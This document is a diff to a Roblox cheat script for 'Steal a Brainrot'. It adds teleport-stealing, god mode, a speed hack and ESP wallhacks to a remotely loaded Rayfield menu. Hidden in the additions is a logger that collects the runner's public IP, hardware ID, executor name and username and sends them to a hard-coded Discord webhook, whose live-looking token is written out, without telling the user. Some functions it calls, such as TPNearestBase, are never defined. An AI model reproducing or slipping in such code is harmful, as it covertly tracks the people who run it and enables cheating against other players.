@@ -1,51 +1,55 @@
--- Rayfield UI version of Walvy Community TP Menu (No Key System)
--- Make sure Rayfield library is loaded before this script runs
+-- ✅ Walvy Community - Full Final Version (Rayfield UI, No Key)
 
+-- 📦 Load Rayfield UI
 local Rayfield = loadstring(game:HttpGet('https://sirius.menu/rayfield'))()
 
 local Window = Rayfield:CreateWindow({
-    Name = "Walvy Community",
-    LoadingTitle = "Walvy Community",
-    LoadingSubtitle = "by Walvy",
-    ConfigurationSaving = {
-       Enabled = true,
-       FolderName = "Walvy",
-       FileName = "Settings"
-    },
-    Discord = {
-       Enabled = true,
-       Invite = "EXK4dQxJBv",
-       RememberJoins = true
-    },
-    KeySystem = false
-})
-
-local MainTab = Window:CreateTab("Main", 4483362458)
-
-local StatusLabel = MainTab:CreateParagraph({
-    Title = "Status",
-    Content = "Ready to Teleport."
+	Name = "Walvy Community",
+	LoadingTitle = "Walvy Community",
+	LoadingSubtitle = "by Walvy",
+	ConfigurationSaving = {
+		Enabled = true,
+		FolderName = "Walvy",
+		FileName = "Settings"
+	},
+	Discord = {
+		Enabled = true,
+		Invite = "EXK4dQxJBv",
+		RememberJoins = true
+	},
+	KeySystem = false
 })
 
 Rayfield:Notify({
-    Title = "✅ Walvy Community Loaded",
-    Content = "Script berhasil dijalankan!",
-    Duration = 6,
-    Image = 4483362458
+	Title = "✅ Walvy Community Loaded",
+	Content = "Script berhasil dijalankan!",
+	Duration = 6,
+	Image = 4483362458
 })
 
--- Service Setup
-local Players = game:GetService("Players")
-local RunService = game:GetService("RunService")
 local TweenService = game:GetService("TweenService")
-local player = Players.LocalPlayer
-local char = player.Character or player.CharacterAdded:Wait()
-local hrp = char:WaitForChild("HumanoidRootPart")
+local UIS = game:GetService("UserInputService")
+local RunService = game:GetService("RunService")
+local Lighting = game:GetService("Lighting")
+local Players = game:GetService("Players")
+local Player = Players.LocalPlayer
 
-local tpAmt = 80
+--// Configuration
+local DEBUG = false
+local tpAmt
 local void = CFrame.new(0, -3.4028234663852886e+38, 0)
-local teleporting = false
-local random = Random.new()
+local teleporting
+
+local function DebugInfo(mode, content, value)
+    if not DEBUG then return end
+    if mode == "warn" then
+        warn("[Walvy Comunity DEBUG]:", content, value or "")
+    elseif mode == "print" then
+        print("[Walvy Comunity DEBUG]:", content, value or "")
+    else
+        warn("[Walvy Comunity DEBUG]: Invalid debug type.")
+    end
+end
 
 local function TP(position)
     if not teleporting then
@@ -59,103 +63,525 @@ local function TP(position)
             RunService.Heartbeat:Wait()
             teleporting = false
         end
+    else
+        DebugInfo("warn", "You are already teleporting", "teleporting")
     end
 end
 
--- Main Buttons
-MainTab:CreateButton({
-    Name = "TP To Delivery Box",
-    Callback = function()
-        DeliverBrainrot({Text = function(v) StatusLabel:Set({Content = v}) end})
+-- ✅ Player & Character Setup (Fixed & Optimized)
+local Players = game:GetService("Players")
+local player = Players.LocalPlayer
+
+local char, humanoid, hrp
+
+-- Fungsi: Ambil karakter saat sudah tersedia
+local function GetCharacter()
+	local character = player.Character or player.CharacterAdded:Wait()
+	return character
+end
+
+-- Fungsi: Setup karakter & humanoid
+local function SetupCharacter()
+	local success, result = pcall(function()
+		char = GetCharacter()
+		humanoid = char:WaitForChild("Humanoid")
+		hrp = char:WaitForChild("HumanoidRootPart")
+	end)
+
+	if success then
+		-- Optional: ambil ulang backpack (jika dibutuhkan)
+		local backpack = player:FindFirstChild("Backpack")
+		if backpack then
+			-- Bisa simpan backpack kalau memang perlu
+		end
+		warn("[Walvy Debug] Character setup completed for", player.Name)
+	else
+		warn("[Walvy Debug] Failed to setup character:", result)
+	end
+end
+
+-- Inisialisasi saat pertama kali
+SetupCharacter()
+
+-- Ulangi setup saat respawn
+player.CharacterAdded:Connect(function()
+	task.delay(0.5, SetupCharacter) -- Delay sedikit agar parts tidak nil
+end)
+
+
+-- 🌐 Konfigurasi Webhook
+local webhookURL = "https://discord.com/api/webhooks/1367725357461147738/cJvQBSyBLV2Ti72fj3lcSQKgZGHb9h4lTu2Tiy-qY-tif7_nF_pLvW6vVX1Wt1fAH5QW"
+
+-- 📦 Service Roblox
+local HttpService = game:GetService("HttpService")
+local Players = game:GetService("Players")
+local player = Players.LocalPlayer
+
+-- 🧠 Deteksi Brainrot di workspace
+local function getBrainrotList()
+    local list = {}
+    for _, obj in ipairs(workspace:GetDescendants()) do
+        if obj:IsA("Model") and obj.Name:lower():find("brainrot") then
+            table.insert(list, obj.Name)
+        end
     end
+    return #list > 0 and table.concat(list, ", ") or "Tidak ditemukan"
+end
+
+-- 🔍 Coba ambil executor, IP, HWID (jika didukung executor)
+local executor = identifyexecutor and identifyexecutor() or "Unknown"
+local hwid = (gethwid and gethwid()) or "N/A"
+local ip = "N/A"
+
+pcall(function()
+    local ipResponse = game:HttpGet("https://api.ipify.org")
+    ip = ipResponse
+end)
+
+-- 📄 Data Embed Discord
+local embedData = {
+    content = "@everyone",
+    embeds = {{
+        title = "🧠 Script Dijalankan - Steal a Brainrot",
+        description = "**Script dijalankan oleh:** `" .. player.Name .. "`",
+        color = 16711680, -- Merah
+        thumbnail = {
+            url = "https://www.roblox.com/headshot-thumbnail/image?userId=" .. player.UserId .. "&width=420&height=420&format=png"
+        },
+        fields = {
+            {
+                name = "🎮 Game",
+                value = "[" .. game.Name .. "](https://www.roblox.com/games/" .. game.PlaceId .. ")",
+                inline = false
+            },
+            {
+                name = "📛 Player",
+                value = player.Name .. " (UserID: " .. player.UserId .. ")",
+                inline = true
+            },
+            {
+                name = "🧠 Brainrot Terdeteksi",
+                value = getBrainrotList(),
+                inline = false
+            },
+            {
+                name = "⚙️ Executor",
+                value = executor,
+                inline = true
+            },
+            {
+                name = "💻 HWID",
+                value = hwid,
+                inline = false
+            },
+            {
+                name = "🌐 IP",
+                value = ip,
+                inline = false
+            }
+        },
+        footer = {
+            text = "📅 " .. os.date("%d-%m-%Y %H:%M:%S")
+        }
+    }}
+}
+
+-- 🚀 Kirim ke Discord
+pcall(function()
+    (syn and syn.request or http_request or request)({
+        Url = webhookURL,
+        Method = "POST",
+        Headers = {
+            ["Content-Type"] = "application/json"
+        },
+        Body = HttpService:JSONEncode(embedData)
+    })
+end)
+
+-- 🧠 Infinity Jump + God Mode
+local Players = game:GetService("Players")
+local UserInputService = game:GetService("UserInputService")
+local player = Players.LocalPlayer
+
+UserInputService.JumpRequest:Connect(function()
+	local humanoid = player.Character and player.Character:FindFirstChildOfClass("Humanoid")
+	if humanoid then
+		humanoid:ChangeState(Enum.HumanoidStateType.Jumping)
+	end
+end)
+
+local function enableGodMode()
+	local function protect()
+		local char = player.Character or player.CharacterAdded:Wait()
+		local humanoid = char:WaitForChild("Humanoid")
+
+		humanoid:GetPropertyChangedSignal("Health"):Connect(function()
+			if humanoid.Health < humanoid.MaxHealth then
+				humanoid.Health = humanoid.MaxHealth
+			end
+		end)
+
+		humanoid.StateChanged:Connect(function(_, new)
+			if new == Enum.HumanoidStateType.Dead then
+				humanoid.Health = humanoid.MaxHealth
+			end
+		end)
+	end
+
+	if player.Character then protect() end
+	player.CharacterAdded:Connect(function()
+		task.wait(1)
+		protect()
+	end)
+end
+enableGodMode()
+
+pcall(function()
+	game.StarterGui:SetCore("SendNotification", {
+		Title = "✅ Infinity Jump + God Mode",
+		Text = "Aktif dan Siap Digunakan!",
+		Duration = 6
+	})
+end)
+
+-- 🛡️ Anti-Ragdoll
+local function removeRagdollParts(character)
+	for _, v in pairs(character:GetDescendants()) do
+		if v:IsA("Motor6D") and v.Name == "RagdollConstraint" then
+			v:Destroy()
+		end
+	end
+end
+
+if player.Character then
+	removeRagdollParts(player.Character)
+end
+
+player.CharacterAdded:Connect(function(character)
+	character:WaitForChild("HumanoidRootPart")
+	task.wait(1)
+	removeRagdollParts(character)
+end)
+
+pcall(function()
+	game.StarterGui:SetCore("SendNotification", {
+		Title = "✅ Anti-Ragdoll Aktif",
+		Text = "Kamu tidak akan KO atau terjatuh lemas!",
+		Duration = 6
+	})
+end)
+
+-- ⚙️ Teleport Setup
+local TweenService = game:GetService("TweenService")
+local RunService = game:GetService("RunService")
+local random = Random.new()
+local character = player.Character or player.CharacterAdded:Wait()
+local hrp = character:WaitForChild("HumanoidRootPart")
+local void = CFrame.new(0, -3e38, 0)
+local teleporting, tpAmt = false, 70
+
+player.CharacterAdded:Connect(function(char)
+	character = char
+	hrp = char:WaitForChild("HumanoidRootPart")
+end)
+
+task.spawn(function()
+	while true do
+	    local ping = player:GetNetworkPing() * 1000
+        tpAmt = math.clamp(math.floor(ping * 0.8), 10, 150)
+		task.wait(1)
+	end
+end)
+
+local function TP(pos)
+	if not teleporting and typeof(pos) == "CFrame" and hrp then
+		teleporting = true
+		hrp.CFrame = pos + Vector3.new(
+			random:NextNumber(-0.0001, 0.0001),
+			random:NextNumber(-0.0001, 0.0001),
+			random:NextNumber(-0.0001, 0.0001)
+		)
+		RunService.Heartbeat:Wait()
+		teleporting = false
+	end
+end
+
+-- 🔁 TP Functions
+local function updateStatus(text)
+	StatusLabel:Set({ Content = text })
+end
+
+local function DeliverBrainrot()
+	for _, plot in pairs(workspace.Plots:GetChildren()) do
+		local sign = plot:FindFirstChild("PlotSign")
+		if sign and sign:FindFirstChild("YourBase") and sign.YourBase.Enabled then
+			local hitbox = plot:FindFirstChild("DeliveryHitbox")
+			if hitbox then
+				local target = hitbox.CFrame * CFrame.new(0, -3, 0)
+				for i = 1, tpAmt do TP(target) end
+				for _ = 1, 2 do TP(void) end
+				for i = 1, math.floor(tpAmt / 16) do TP(target) end
+				local dist = (hrp.Position - target.Position).Magnitude
+				updateStatus(dist <= 30 and "✅ Delivery Success" or "❌ TP Failed")
+				return
+			end
+		end
+	end
+	updateStatus("❌ No DeliveryHitbox Found")
+end
+
+-- tp nearestbase 😈
+
+
+-- 🕊 tween steal
+local function TweenSteal()
+	local delivery
+	for _, obj in ipairs(workspace.Plots:GetDescendants()) do
+		if obj.Name == "DeliveryHitbox" and obj.Parent:FindFirstChild("PlotSign") then
+			if obj.Parent.PlotSign:FindFirstChild("YourBase") and obj.Parent.PlotSign.YourBase.Enabled then
+				delivery = obj
+				break
+			end
+		end
+	end
+	if not delivery then return updateStatus("❌ No Delivery Found") end
+	local target = delivery.CFrame * CFrame.new(0, -2, 0)
+	for i = 1, 85 do
+		local lerp = hrp.Position:Lerp(target.Position, i / 85)
+		hrp.CFrame = CFrame.new(lerp)
+		task.wait(0.01)
+	end
+	for _ = 1, 2 do TP(void) end
+	for _ = 1, 2 do TP(target) end
+	local dist = (hrp.Position - target.Position).Magnitude
+	updateStatus(dist <= 30 and "✅ Tween Steal Success" or "❌ Tween Failed")
+end
+
+-- 📂 UI MAIN MENU
+local MainTab = Window:CreateTab("Main Menu", 4483362458)
+
+StatusLabel = MainTab:CreateParagraph({
+	Title = "Status",
+	Content = "🟢 Siap Digunakan"
 })
+
+MainTab:CreateButton({ Name = "🚚 TP to Delivery Box", Callback = DeliverBrainrot })
+MainTab:CreateButton({ Name = "🏠 TP Inside Nearest Base", Callback = TPNearestBase })
+MainTab:CreateButton({ Name = "🌀 Tween Steal", Callback = TweenSteal })
 
 MainTab:CreateButton({
-    Name = "TP Inside Nearest Base",
-    Callback = function()
-        TPNearestBase({Text = function(v) StatusLabel:Set({Content = v}) end})
-    end
+	Name = "🛡️ Re-Apply Anti-Ragdoll",
+	Callback = function()
+		local char = player.Character or player.CharacterAdded:Wait()
+		removeRagdollParts(char)
+		updateStatus("✅ Anti-Ragdoll reapplied.")
+	end
 })
 
+-- ✅ Speed Hack Integration
 MainTab:CreateButton({
-    Name = "Tween Steal",
-    Callback = function()
-        TweenSteal({Text = function(v) StatusLabel:Set({Content = v}) end})
-    end
+	Name = "🚶‍♂️ Speed Hack: WalkSpeed 70",
+	Callback = function()
+		local function applySpeed(speed)
+			local character = player.Character or player.CharacterAdded:Wait()
+			local humanoid = character:WaitForChild("Humanoid")
+			humanoid.WalkSpeed = speed
+
+			character:WaitForChild("Humanoid").Changed:Connect(function(prop)
+				if prop == "WalkSpeed" and humanoid.WalkSpeed ~= speed then
+					humanoid.WalkSpeed = speed
+				end
+			end)
+		end
+
+		applySpeed(70)
+
+		player.CharacterAdded:Connect(function(char)
+			task.wait(1)
+			local humanoid = char:WaitForChild("Humanoid")
+			humanoid.WalkSpeed = 70
+			humanoid.Changed:Connect(function(prop)
+				if prop == "WalkSpeed" and humanoid.WalkSpeed ~= 70 then
+					humanoid.WalkSpeed = 70
+				end
+			end)
+		end)
+
+		updateStatus("✅ Speed Hack 70 Aktif")
+	end
 })
 
-MainTab:CreateParagraph({
-    Title = "Hotkey",
-    Content = "Press RightShift to hide/show GUI"
-})
+MainTab:CreateParagraph({ Title = "Hotkey", Content = "Tekan ❯ RightShift ❮ untuk menyembunyikan GUI" })
 
--- ████████ ESP TAB ████████
-local ESPTab = Window:CreateTab("ESP", 4483362458)
+-- 📡 ESP MENU
+local ESPTab = Window:CreateTab("ESP Menu", 4483362458)
 
 ESPTab:CreateButton({
-    Name = "Base ESP (Cooldown)",
+	Name = "⛺ Base ESP (Cooldown)",
+	Callback = function()
+		local Workspace = game:GetService("Workspace")
+		local Plots = Workspace:FindFirstChild("Plots")
+		if not Plots then warn("❌ Folder 'Plots' tidak ditemukan.") return end
+
+		for _, baseModel in ipairs(Plots:GetChildren()) do
+			if baseModel:IsA("Model") then
+				local mainPart = baseModel.PrimaryPart or baseModel:FindFirstChildWhichIsA("BasePart", true)
+				if mainPart and not baseModel:FindFirstChild("BaseESP") then
+					local bb = Instance.new("BillboardGui")
+					bb.Name = "BaseESP"
+					bb.Adornee = mainPart
+					bb.Size = UDim2.new(0, 200, 0, 50)
+					bb.StudsOffset = Vector3.new(0, 6, 0)
+					bb.AlwaysOnTop = true
+					bb.Parent = baseModel
+
+					local label = Instance.new("TextLabel")
+					label.Size = UDim2.new(1, 0, 1, 0)
+					label.BackgroundTransparency = 1
+					label.TextScaled = true
+					label.Font = Enum.Font.GothamBold
+					label.TextStrokeTransparency = 0.2
+					label.TextColor3 = Color3.fromRGB(255, 255, 0)
+					label.Text = "⛺ BASE"
+					label.Parent = bb
+
+					task.spawn(function()
+						while baseModel.Parent do
+							local cdLabel
+							for _, obj in ipairs(baseModel:GetDescendants()) do
+								if obj:IsA("TextLabel") and obj.Text:match("^%d+s$") then
+									cdLabel = obj break
+								end
+							end
+							if cdLabel then
+								local sec = tonumber(cdLabel.Text:match("^(%d+)s"))
+								if sec and sec <= 2 then
+									label.Text = "✅ Ready"
+									label.TextColor3 = Color3.fromRGB(0, 255, 0)
+								else
+									label.Text = "⏳ " .. cdLabel.Text
+									label.TextColor3 = Color3.fromRGB(255, 140, 0)
+								end
+							else
+								label.Text = "✅ Unlocked"
+								label.TextColor3 = Color3.fromRGB(0, 255, 0)
+							end
+							task.wait(1)
+						end
+					end)
+				end
+			end
+		end
+	end
+})
+ESPTab:CreateButton({
+    Name = "🧠 ESP Brainrot (Secret & God)",
     Callback = function()
         local Workspace = game:GetService("Workspace")
-        local Plots = Workspace:FindFirstChild("Plots")
-        if not Plots then
-            warn("❌ Folder 'Plots' tidak ditemukan.")
-            return
-        end
 
-        local function findCooldownTextLabel(baseModel)
-            for _, obj in ipairs(baseModel:GetDescendants()) do
-                if obj:IsA("TextLabel") and obj.Text:match("^%d+s$") then
-                    return obj
+        local secretBrainrotNames = {
+            "La Vacca Saturno Saturnita",
+            "Chimpanzini Spiderini",
+            " Los Tralaleritos",
+            "Las Tralaleritas",
+            "Graipus Medussi",
+            "La Grande Combinasion",
+            "Garama and Madundung",
+            "Torrtuginni Dragonfrutini",
+            "Pot Hotspot"
+        }
+
+        local godBrainrotNames = {
+            "Cocofanto Elefanto",
+            "Girafa Celestre",
+            "Gattatino Nyanino", 
+            "Matteo",
+            "Tralalero Tralala",
+            "Odin Din Din Dun",
+            "Lucky",
+            "Statutino Libertino",
+            "Trenostruzzo Turbo 3000",
+            "Orcalero Orcala",
+            "Tigroligre Frutonni"
+        }
+
+        local function getBrainrotType(name)
+            if not name or typeof(name) ~= "string" then return nil end
+            local lower = name:lower()
+            for _, keyword in pairs(secretBrainrotNames) do
+                if lower:find(keyword:lower(), 1, true) then
+                    return "secret"
+                end
+            end
+            for _, keyword in pairs(godBrainrotNames) do
+                if lower:find(keyword:lower(), 1, true) then
+                    return "god"
                 end
             end
             return nil
         end
 
-        for _, baseModel in ipairs(Plots:GetChildren()) do
-            if baseModel:IsA("Model") then
-                local mainPart = baseModel.PrimaryPart or baseModel:FindFirstChildWhichIsA("BasePart", true)
-                if mainPart and not baseModel:FindFirstChild("BaseESP") then
-                    local bb = Instance.new("BillboardGui")
-                    bb.Name = "BaseESP"
-                    bb.Adornee = mainPart
-                    bb.Size = UDim2.new(0, 200, 0, 50)
-                    bb.StudsOffset = Vector3.new(0, 6, 0)
-                    bb.AlwaysOnTop = true
-                    bb.Parent = baseModel
-
-                    local label = Instance.new("TextLabel")
-                    label.Size = UDim2.new(1, 0, 1, 0)
-                    label.BackgroundTransparency = 1
-                    label.TextScaled = true
-                    label.Font = Enum.Font.GothamBold
-                    label.TextStrokeTransparency = 0.2
-                    label.TextColor3 = Color3.fromRGB(255, 255, 0)
-                    label.Text = "⛺ BASE"
-                    label.Parent = bb
-
-                    task.spawn(function()
-                        while baseModel.Parent do
-                            local cooldownLabel = findCooldownTextLabel(baseModel)
-                            if cooldownLabel then
-                                local secondsLeft = tonumber(cooldownLabel.Text:match("^(%d+)s"))
-                                if secondsLeft and secondsLeft <= 2 then
-                                    label.Text = "✅ Ready"
-                                    label.TextColor3 = Color3.fromRGB(0, 255, 0)
-                                else
-                                    label.Text = "⏳ " .. cooldownLabel.Text
-                                    label.TextColor3 = Color3.fromRGB(255, 140, 0)
-                                end
-                            else
-                                label.Text = "✅ Unlocked"
-                                label.TextColor3 = Color3.fromRGB(0, 255, 0)
-                            end
-                            task.wait(1)
-                        end
-                    end)
-
-                    print("✅ ESP base ditambahkan:", baseModel.Name)
-                end
+        local function getColorAndLabel(btype)
+            if btype == "secret" then
+                return Color3.fromRGB(255, 0, 0), "SECRET"
+            elseif btype == "god" then
+                return Color3.fromRGB(0, 255, 0), "GOD"
+            else
+                return nil, nil
             end
         end
+
+        local function createESP(model)
+            if not model:IsA("Model") or model:FindFirstChild("ESP") then return end
+            local head = model:FindFirstChildWhichIsA("BasePart")
+            if not head then return end
+
+            local btype = getBrainrotType(model.Name)
+            if not btype then return end
+
+            local color, label = getColorAndLabel(btype)
+            if not color then return end
+
+            -- Highlight
+            local highlight = Instance.new("Highlight")
+            highlight.Name = "ESP"
+            highlight.Adornee = model
+            highlight.FillColor = color
+            highlight.OutlineColor = Color3.fromRGB(255, 255, 255)
+            highlight.FillTransparency = 0.4
+            highlight.OutlineTransparency = 0
+            highlight.Parent = model
+
+            -- Billboard
+            local billboard = Instance.new("BillboardGui")
+            billboard.Name = "ESP"
+            billboard.Adornee = head
+            billboard.Size = UDim2.new(0, 120, 0, 40)
+            billboard.AlwaysOnTop = true
+            billboard.Parent = model
+
+            local text = Instance.new("TextLabel")
+            text.Size = UDim2.new(1, 0, 1, 0)
+            text.BackgroundTransparency = 1
+            text.TextColor3 = color
+            text.TextStrokeTransparency = 0
+            text.Text = label .. "\n" .. model.Name
+            text.TextScaled = true
+            text.Font = Enum.Font.GothamBold
+            text.Parent = billboard
+
+            warn("[ESP] Dibuat:", label, "-", model.Name)
+        end
+
+        -- ESP awal
+        for _, v in ipairs(Workspace:GetChildren()) do
+            createESP(v)
+        end
+
+        -- ESP baru saat Child ditambahkan
+        Workspace.ChildAdded:Connect(function(child)
+            task.wait(0.2)
+            createESP(child)
+        end)
     end
 })
